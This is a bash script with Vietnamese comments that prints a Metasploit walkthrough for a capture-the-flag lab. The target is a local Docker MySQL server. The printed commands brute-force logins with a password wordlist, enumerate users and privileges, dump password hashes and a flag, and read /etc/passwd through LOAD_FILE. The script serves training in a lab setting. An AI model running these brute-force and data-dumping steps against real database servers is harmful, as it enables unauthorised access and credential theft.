#!/usr/bin/env bash
# ============================================================
# Metasploit MySQL Attack Guide
# Target: MySQL 8.0 chạy trong Docker, expose port 3306
#
# Yêu cầu:
#   - Metasploit Framework đã cài (Kali Linux / Parrot OS)
#   - docker-compose up đang chạy (MySQL port 3306 mở)
#   - Đã hoàn thành Phase 1: sqlmap dump → có thông tin users
#
# Attack flow:
#   mysql_login  → brute force tìm credentials
#   mysql_enum   → enumerate users, privileges, databases
#   mysql_sql    → chạy query tùy ý qua Metasploit
# ============================================================

RHOST="127.0.0.1"    # Địa chỉ host chạy Docker
RPORT="3306"          # Port MySQL expose ra ngoài

echo "============================================================"
echo "  Metasploit MySQL Attack Guide — CTF Blog Pentest Lab"
echo "============================================================"
echo ""
echo "Target: ${RHOST}:${RPORT}"
echo ""

# ── MODULE 1: mysql_login — Brute Force Credentials ─────────
# Mục đích: tìm username/password MySQL hợp lệ
# pentestuser:weak123 được seed sẵn để demo
#
# Các option quan trọng:
#   RHOSTS     : địa chỉ IP mục tiêu
#   RPORT      : port MySQL (default 3306)
#   USERNAME   : thử một username cụ thể
#   USER_FILE  : file danh sách username
#   PASS_FILE  : file wordlist password (rockyou.txt)
#   STOP_ON_SUCCESS : dừng ngay khi tìm được credentials đúng
#   VERBOSE    : true để xem từng attempt (chậm hơn)

echo "=== MODULE 1: Brute Force MySQL Credentials ==="
echo ""
echo "Chạy lệnh sau trong msfconsole:"
echo ""
cat << 'MSFRCE'
msfconsole -q << 'EOF'

# ── Brute force với username cụ thể ──────────────────────────
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 127.0.0.1
set RPORT 3306
set USERNAME pentestuser
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE false
run

# Nếu rockyou.txt chưa được giải nén trên Kali:
# sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

EOF
MSFRCE

echo ""
echo "Kết quả mong đợi: pentestuser:weak123 (password trong top 1000 rockyou.txt)"
echo ""

# ── MODULE 2: mysql_enum — Enumerate Database ────────────────
# Mục đích: sau khi có credentials, liệt kê toàn bộ thông tin
# database: users, privileges, schemas, variables
#
# Thông tin thu thập được:
#   - Danh sách MySQL users và privileges
#   - Danh sách databases và tables
#   - MySQL version, hostname, datadir
#   - Các user có privilege FILE (có thể đọc/ghi file hệ thống)

echo "=== MODULE 2: Enumerate MySQL (sau khi có credentials) ==="
echo ""
cat << 'MSFRCE'
msfconsole -q << 'EOF'

use auxiliary/admin/mysql/mysql_enum
set RHOSTS 127.0.0.1
set RPORT 3306
set USERNAME pentestuser
set PASSWORD weak123
run

EOF
MSFRCE

echo ""
echo "Kết quả mong đợi:"
echo "  - Danh sách users: root, ctf_user, pentestuser"
echo "  - Privileges của từng user"
echo "  - Danh sách databases: ctf_blog, information_schema"
echo ""

# ── MODULE 3: mysql_sql — Chạy Query Tùy Ý ──────────────────
# Mục đích: thực thi SQL query trực tiếp qua Metasploit
# Không cần MySQL client, không cần SQLi — truy cập thẳng
#
# Dùng để:
#   - Đọc FLAG từ bảng blog_post
#   - Xem thông tin user
#   - Kiểm tra dữ liệu bất kỳ

echo "=== MODULE 3: Chạy SQL Query qua Metasploit ==="
echo ""
cat << 'MSFRCE'
msfconsole -q << 'EOF'

use auxiliary/admin/mysql/mysql_sql
set RHOSTS 127.0.0.1
set RPORT 3306
set USERNAME pentestuser
set PASSWORD weak123

# Lấy thông tin version và user hiện tại
set SQL SELECT version(), user(), database()
run

# Liệt kê tất cả databases
set SQL SHOW DATABASES
run

# Dump FLAG từ bảng blog_post (bản ghi private)
set SQL SELECT id, title, secret_flag, status FROM ctf_blog.blog_post WHERE secret_flag IS NOT NULL
run

# Dump thông tin users (username + password hash)
set SQL SELECT username, password, email, is_staff FROM ctf_blog.blog_user
run

# Đọc file hệ thống (nếu user có FILE privilege)
set SQL SELECT LOAD_FILE('/etc/passwd')
run

EOF
MSFRCE

echo ""
echo "=== HOÀN TẤT METASPLOIT PHASE ==="
echo ""
echo "Attack chain đã thực hiện:"
echo "  1. SQLi qua /posts/?sort= → dump database"
echo "  2. mysql_login             → brute force credentials"
echo "  3. mysql_enum              → enumerate database"
echo "  4. mysql_sql               → query trực tiếp, lấy FLAG"
echo ""
echo "FLAG: HTB{Dj4ng0_CVE_2021_35042}"
echo ""

# ── Lệnh một dòng tiện lợi ───────────────────────────────────
echo "=== QUICK ONE-LINER (brute force nhanh) ==="
echo ""
echo "msfconsole -q -x \\"
echo "  \"use auxiliary/scanner/mysql/mysql_login;"
echo "   set RHOSTS ${RHOST};"
echo "   set RPORT ${RPORT};"
echo "   set USERNAME pentestuser;"
echo "   set PASS_FILE /usr/share/wordlists/rockyou.txt;"
echo "   set STOP_ON_SUCCESS true;"
echo "   run\""
